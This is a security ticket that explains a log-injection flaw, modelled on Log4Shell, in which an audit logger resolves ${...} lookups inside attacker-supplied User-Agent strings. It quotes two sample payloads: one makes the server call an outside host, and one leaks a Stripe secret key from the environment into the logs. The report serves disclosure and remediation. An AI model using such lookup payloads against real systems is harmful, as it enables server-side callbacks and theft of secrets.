title: Our server calls back to whoever logs in
ticket: SECURITY REPORT. A researcher tried to log in with the User-Agent ${http:https://their-server.example/ping} and our server made an HTTP request to their machine. They also say that ${env:STRIPE_SECRET_KEY} as a User-Agent makes our live key show up in the log viewer. Lookups are only supposed to work in logging.properties.
explanation: AuditLog.write formats the message first, which pastes the attacker's User-Agent into the text, and then runs the Interpolator over the whole line. Any ${env:...}, ${sys:...} or ${http:...} the attacker typed is resolved as if the developer had written it. Lookups belong to the trusted pattern, never to the values filled into it. Log4Shell was the same shape: Log4j resolved ${jndi:...} lookups inside logged user input.
